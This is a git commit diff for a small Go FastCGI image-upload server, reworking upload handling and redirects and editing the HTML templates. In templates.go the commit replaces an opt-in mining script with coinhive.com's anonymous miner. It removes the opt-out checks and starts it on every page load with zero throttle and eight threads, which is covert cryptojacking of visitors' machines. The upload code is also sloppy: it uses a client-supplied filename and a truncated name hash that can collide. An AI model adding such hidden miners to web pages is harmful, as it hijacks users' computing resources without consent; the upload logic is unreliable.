89e7c0e4c9abe41bea420d095f127a6fff1dd069
Gideon <celtictarot386@gmail.com>
2018-05-17 20:54:49 -0400

    Added auto redirect and added some protections, I only raged a *few* times

--- app.go
+++ app.go
@@ -10,6 +10,7 @@ import (
 	"net"
 	"net/http"
 	"net/http/fcgi"
+	"net/textproto"
 	"os"
 	"path"
 	"path/filepath"
@@ -25,12 +26,19 @@ const (
 	defaultImg = "/home/gido5731/work/imgsrvr/testingpics/Graphic1-50.jpg"
 	imgHash    = 6
 	imgStore   = "/var/tmp/imgStorage/"
+	baseUrl    = "localhost"
 )
 
 type FastCGIServer struct{}
 type tData struct {
 	Fn string
 	Tn string
+}
+
+type FileHeader struct {
+	Filename string
+	Header   textproto.MIMEHeader
+	// contains filtered or unexported fields
 }
 
 //404 support, I dont know why I did this but I am too scared to undo it at this point
@@ -47,14 +55,14 @@ func appPage(resp http.ResponseWriter, req *http.Request) {
 		fmt.Printf("Failed to parse template: %v", err)
 		return
 	}
-
+	req.ParseForm()
 	field := req.FormValue("fn")
 	fmt.Println(field)
 	tData := tData{
 		Fn: field,
 	}
 	//upload(resp, req)
-	fmt.Printf("Form data: ", field, "\ntData: ", tData)
+	fmt.Println("Form data: ", field, "\ntData: ", tData)
 
 	if err = firstPageTemplate.Execute(resp, tData); err != nil {
 		fmt.Printf("template execute error: %v", err)
@@ -65,61 +73,75 @@ func appPage(resp http.ResponseWriter, req *http.Request) {
 }
 
 //testingPage!!! Missleading name, I know, this page takes the info from last page to upload
-func testingPage(resp http.ResponseWriter, req *http.Request) {
+func testingPage(resp http.ResponseWriter, req *http.Request, encodedMd5 string) {
 	/* TODO:
 	store file on disk:
 	-Accept the file 								DONE
-	-create name (from md5)							DONE
+	-create name (from md5)						DONE
 	-create a map/index of pub name (hash) to path	(Postponed)
-	provide path to file
+	provide path to file							DONE
 	*/
-	http.HandleFunc("/img", upload)
+	req.ParseForm()
+
 	upload(resp, req)
-
 }
-func upload(resp http.ResponseWriter, req *http.Request) {
 
-	fmt.Println("method:", req.Method)
+func upload(resp http.ResponseWriter, req *http.Request) /*(string, error)*/ {
+	//encodedMd5 := string()
+	//req.ParseForm()
+	//fmt.Println("method:", req.Method)
 	if req.Method == "GET" {
+		fmt.Println("Yo, its GET for the upload, btw")
 		crutime := time.Now().Unix()
 		fmt.Println("Beep Beep Beep... The time is:", crutime)
 		md5 := md5.New()
 		io.WriteString(md5, strconv.FormatInt(crutime, 10))
-		encodedMd5 := make([]byte, hex.EncodedLen(imgHash))
-		byteMd5 := []byte("md5")
-		hex.Encode(byteMd5, encodedMd5)
-		fmt.Println("I just got the hashed md5! Here it is:", encodedMd5, "\nEnd of md5")
+		bytemd5 := []byte("md5")
+		encodedMd5 := hex.EncodeToString(bytemd5)
+		fmt.Println("I just got the hashed md5! Here it is:", encodedMd5, "\nEnd of md5sum")
 		//fmt.Printf("MD5:", md5)
 		token := fmt.Sprintf("%x", md5.Sum(nil))
 		t, _ := template.ParseFiles("upload.gtpl")
 		t.Execute(resp, token)
+		fileURL := "http://" + baseUrl + urlPrefix + "i/" + encodedMd5
+		http.Redirect(resp, req, fileURL, 301)
 	} else {
+		req.ParseForm()
+		//img := req.FormFile("img")
+		fmt.Println("Yo, its POST for the upload, btw")
 		req.ParseMultipartForm(32 << 20)
 		crutime := time.Now().Unix()
 		fmt.Println("Beep Beep Beep... The time is:", crutime)
-
-		file, handler, err := req.FormFile("img")
+		file, handler, err := req.FormFile("uploadfile")
 		if err != nil {
 			fmt.Println(err)
 			return
 		}
+		os.Open(handler.Filename)
+		defer file.Close()
 		md5 := md5.New()
 		io.WriteString(md5, strconv.FormatInt(crutime, 10))
-		byteMd5 := []byte("md5")
-		encodedMd5 := hex.EncodeToString(byteMd5)
-		fmt.Println("I just got the hashed md5! Here it is:", encodedMd5, "\nEnd of md5")
-		//fmt.Printf("MD5:", md5)
+		byteMd5 := []byte(handler.Filename)
+		encodedMd5 := hex.EncodeToString(byteMd5)[:imgHash]
+		fmt.Println("I just hashed md5! Here it is:", encodedMd5, "\nEnd of md5sum")
+		//fmt.Printf("MD5:", md5)ot the
 		//token := fmt.Sprintf("%x", md5.Sum(nil))
 		//t, _ := template.ParseFiles("upload.gtpl")
 		//t.Execute(resp, token)
-		fmt.Println("file: ", file)
 		firstChar := string(encodedMd5[0])
 		secondChar := string(encodedMd5[1])
 		//fmt.Printf("File:", file, "\nhandler: ", handler) //too spammy for normal use
 		defer file.Close()
-		fmt.Fprintf(resp, "%v", handler.Header)
-		filepath := path.Join(imgStore, firstChar, secondChar, encodedMd5)
-		f, err := os.OpenFile(filepath+encodedMd5, os.O_WRONLY|os.O_CREATE, 0666)
+		//fmt.Fprintf(resp, "%v", handler.Header)
+		os.Open(handler.Filename)
+		fmt.Printf("FileName: %s \n", handler.Filename)
+		nameSplit := strings.Split(handler.Filename, ".")
+		fmt.Printf("File extension: %s\n", nameSplit[len(nameSplit)-1])
+		fileName := encodedMd5 + "." + nameSplit[len(nameSplit)-1]
+		filepath := path.Join(imgStore, firstChar, secondChar, fileName)
+		fmt.Println("file: ", file)
+
+		f, err := os.OpenFile(filepath, os.O_WRONLY|os.O_CREATE, 0666)
 		fmt.Println("filename?: ", filepath)
 		if err != nil {
 			fmt.Println(err)
@@ -127,17 +149,26 @@ func upload(resp http.ResponseWriter, req *http.Request) {
 		}
 		defer f.Close()
 		io.Copy(f, file)
-		sendImg(resp, req, encodedMd5)
+		fmt.Println("Saved file!")
+		//sendImg(resp, req, encodedMd5)
+		//return encodedMd5, err
+		fileURL := "http://" + baseUrl + urlPrefix + "i/" + fileName
+		http.Redirect(resp, req, fileURL, http.StatusSeeOther)
 	}
+	//return encodedMd5, err
 }
 
 // Page for sending pics
 func sendImg(resp http.ResponseWriter, req *http.Request, img string) {
 	fmt.Println("Recieved a req to send the user a file")
-	if len(img) != imgHash {
+	nameSplit := strings.Split(img, ".")
+	imgTitle := nameSplit[0]
+	if len(imgTitle) != imgHash {
 		//img = defaultImg //if no image exists, use testing image
 		//fmt.Println("Using Default Image")
 		errorHandler(resp, req, 404)
+		fmt.Println("Well this is awkward, our hash is bad, sending 404")
+		return
 	}
 	firstChar := string(img[0])
 	secondChar := string(img[1])
@@ -148,6 +179,8 @@ func sendImg(resp http.ResponseWriter, req *http.Request, img string) {
 	if err != nil {
 		//File not found, send 404
 		errorHandler(resp, req, http.StatusNotFound)
+		fmt.Printf("ERROR: %s", err)
+		return
 	}
 
 	//File is found, create and send the correct headers
@@ -162,7 +195,7 @@ func sendImg(resp http.ResponseWriter, req *http.Request, img string) {
 	//Get the file size
 	fileStat, _ := openfile.Stat()                     //Get info from file
 	fileSize := strconv.FormatInt(fileStat.Size(), 10) //Get file size as a string
-	fmt.Printf("Heres the file size: ", fileSize)
+	fmt.Printf("Heres the file size: %s", fileSize)
 
 	//Send the headers
 	//resp.Header().Set("Content-Disposition", "attachment; filename="+Filename)
@@ -189,7 +222,7 @@ func (s FastCGIServer) ServeHTTP(resp http.ResponseWriter, req *http.Request) {
 	if req.Body == nil {
 		return
 	}
-	fmt.Printf("URL is: %v\n", req.URL.Path)
+	crutime := time.Now().Unix()
 
 	urlSplit := strings.Split(req.URL.Path, "/")
 	urlECount := len(urlSplit)
@@ -212,7 +245,16 @@ func (s FastCGIServer) ServeHTTP(resp http.ResponseWriter, req *http.Request) {
 			errorHandler(resp, req, http.StatusNotFound)
 			return
 		}
-		testingPage(resp, req)
+		req.ParseMultipartForm(32 << 20)
+		md5 := md5.New()
+		fmt.Println("Im in the test case!")
+		io.WriteString(md5, strconv.FormatInt(crutime, 10))
+		bytemd5 := []byte("md5")
+		encodedMd5 := hex.EncodeToString(bytemd5)
+		fmt.Println("I just hashed md5! Here it is:", encodedMd5, "\nEnd of md5sum")
+		sendImg(resp, req, encodedMd5)
+		fmt.Printf("URL is: %v\n", req.URL.Path)
+		testingPage(resp, req, encodedMd5)
 	case "i":
 		// Checks for hash/element/thing
 		if urlECount != 4 {
@@ -223,6 +265,13 @@ func (s FastCGIServer) ServeHTTP(resp http.ResponseWriter, req *http.Request) {
 		fmt.Printf("Split for image: %v\n", urlSplit)
 		sendImg(resp, req, urlSplit[3])
 		//upload(resp, req)
+	case "upload":
+		if urlECount != 4 {
+			errorHandler(resp, req, http.StatusNotFound)
+			return
+		}
+		fmt.Println("Upload selected")
+		upload(resp, req)
 	default:
 		appPage(resp, req)
 	}
@@ -243,6 +292,8 @@ func main() {
 
 	go createImgDir(imgStore)
 
+	//http.HandleFunc("/app/upload/", upload)
+	//http.HandleFunc("/app/", firstPage)
 	fmt.Println("Starting the program.")
 	listener, _ := net.Listen("tcp", "127.0.0.1:9001")
 	fmt.Println("Started the listener.")
@@ -265,6 +316,7 @@ func main() {
 		fmt.Printf("Error happened!!! Here, take it: %v", err)
 	}
 	fmt.Printf("DIR: %v\n", dir)
+	fmt.Printf("Heres the prefix for the url, dummy: %s \n", urlPrefix)
 	//end of Debug
 
 	fcgi.Serve(listener, srv) //end of request
--- templates.go
+++ templates.go
@@ -7,6 +7,8 @@ package main
 */
 var (
 	firstPage = `<html>
+
+
 <head><title>This is the first page</title></head>
 <body>
 There is text here. <br>
@@ -17,22 +19,21 @@ and more text here.
 field from request: {{ .Fn}}
 </p>
 
-<form enctype="multipart/form-data" action="/app/test/" method="POST">
+<form enctype="multipart/form-data" action="/app/upload/" method="post">
   First name: <input type="text" name="fn"><br>
   Last name: <input type="text" name="tn"><br>
-	IMG: <input type="file" name="img"><br>
+  <input type="hidden" name="token" value="{{.}}"/>
+	IMG: <input type="file" name="uploadfile"><br>
   <input type="submit" value="Go!">
 </form>
 
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.0});
+	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
 
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	//if (!miner.isMobile() && !miner.didOptOut(14400)) {
-	miner.start();
-  //}
+  miner.start();
+  miner.setThrottle(0)
+  miner.setNumThreads(8)
   
 </script>
 
@@ -58,17 +59,15 @@ var (
     <input type="submit" value="back to main!">
   </form>
 
-  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.0});
-
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	//if (!miner.isMobile() && !miner.didOptOut(14400)) {
-	miner.start();
-  //}
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
   
-</script>
+    miner.start();
+    miner.setThrottle(0)
+    miner.setNumThreads(8)
+    
+  </script>
 
   </body> </html>`
 )
